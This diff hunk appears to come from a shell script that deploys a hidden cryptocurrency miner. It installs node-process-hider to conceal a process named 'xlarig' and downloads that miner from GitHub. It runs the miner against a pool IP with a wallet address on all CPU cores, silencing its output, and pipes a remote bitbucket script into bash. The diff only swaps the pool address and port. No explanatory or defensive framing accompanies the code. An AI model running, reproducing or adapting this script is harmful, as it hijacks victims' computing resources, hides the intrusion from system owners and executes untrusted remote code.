@@ -11,5 +11,5 @@ echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
 sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add xlarig"
 mkdir .kap && cd .kap
 wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o 139.144.119.94:80 -u ZEPHsB6FVC592wSbqrzZihFwcUYVZ6qMtPg3Jxpor71LCQDc8WMbK5165QZBked1e5JdPrqhMm2RZc54FTNZuoLeC58ctXxwk8k -p YOUR -t $(nproc --all) >/dev/null 2>&1
+./xlarig -o 172.233.92.162:443 -u ZEPHsB6FVC592wSbqrzZihFwcUYVZ6qMtPg3Jxpor71LCQDc8WMbK5165QZBked1e5JdPrqhMm2RZc54FTNZuoLeC58ctXxwk8k -p YOUR -t $(nproc --all) >/dev/null 2>&1
 curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash 
